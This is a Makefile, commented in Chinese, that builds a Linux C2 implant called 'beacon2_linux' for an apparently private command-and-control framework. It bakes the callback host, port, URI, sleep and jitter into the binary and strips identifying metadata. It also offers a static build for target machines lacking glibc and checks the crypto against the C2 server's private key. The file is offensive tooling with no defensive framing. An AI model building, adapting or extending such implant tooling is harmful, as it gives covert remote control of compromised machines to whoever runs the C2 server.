# csdev :: linux/Makefile  --  协议 v2 Linux 植入体构建
# ==========================================================================
# 在 WSL (或任意 Linux) 内执行:
#   make                                   # 默认 127.0.0.1:8443
#   make C2_HOST=10.0.0.5 C2_PORT=8443     # 指定回连地址
#   make static                            # 静态链接版本 (无 glibc 依赖)
#   make check                             # RSA 交叉验证 (需 python3+openssl)
#   make clean
#
# Windows 侧一键入口: tools/build_linux2.ps1 (内部调 make 或直接调 gcc)
# ==========================================================================

CC      ?= gcc
C2_HOST ?= 127.0.0.1
C2_PORT ?= 8443
C2_URI  ?= /submit
C2_SLEEP  ?= 5000
C2_JITTER ?= 10

# 纯 socket 实现, 无内置 TLS 栈; C2_SSL=1 会在编译期明确报错而不是静默降级
C2_SSL  ?= 0

CFLAGS  ?= -O2 -Wall -Wextra -fno-ident -fno-asynchronous-unwind-tables -fno-stack-protector
LDFLAGS ?= -s

DEFS = -DC2_HOST='"$(C2_HOST)"' \
       -DC2_PORT=$(C2_PORT) \
       -DC2_URI='"$(C2_URI)"' \
       -DC2_SLEEP=$(C2_SLEEP)u \
       -DC2_JITTER=$(C2_JITTER) \
       -DC2_SSL=$(C2_SSL)

# 复用 Windows 侧同一套协议与密码学实现 (纯 C, 无 windows.h)
SRC  = beacon2_linux.c rsa_linux.c \
       ../kits/proto/frame.c \
       ../kits/crypto/aes.c \
       ../kits/crypto/sha256.c

HDR  = ../kits/proto/frame.h ../kits/crypto/crypto.h \
       ../kits/beacon/pubkey.h rsa_linux.h

all: beacon2_linux

beacon2_linux: $(SRC) $(HDR)
	$(CC) $(CFLAGS) $(DEFS) -o $@ $(SRC) $(LDFLAGS)
	@echo "[+] $@  $$(stat -c%s $@) 字节"
	@readelf -d $@ 2>/dev/null | grep -i needed || true

# 静态版: 目标机无 glibc 时的兜底 (体积大, 但零动态依赖)
static: $(SRC) $(HDR)
	$(CC) $(CFLAGS) $(DEFS) -static -o beacon2_linux.static $(SRC) $(LDFLAGS)
	@echo "[+] beacon2_linux.static  $$(stat -c%s beacon2_linux.static) 字节"

rsa_selftest: rsa_selftest.c rsa_linux.c rsa_linux.h ../kits/beacon/pubkey.h
	$(CC) $(CFLAGS) -o $@ rsa_selftest.c rsa_linux.c

# RSA 自测: C 加密 -> 纯 Python 大数 / openssl / 服务端真实私钥 三方解密
check: rsa_selftest
	python3 rsa_crosscheck.py --bin ./rsa_selftest --server-key /mnt/d/csdev-c2/data/csdev.key

clean:
	rm -f beacon2_linux beacon2_linux.static rsa_selftest

.PHONY: all static check clean
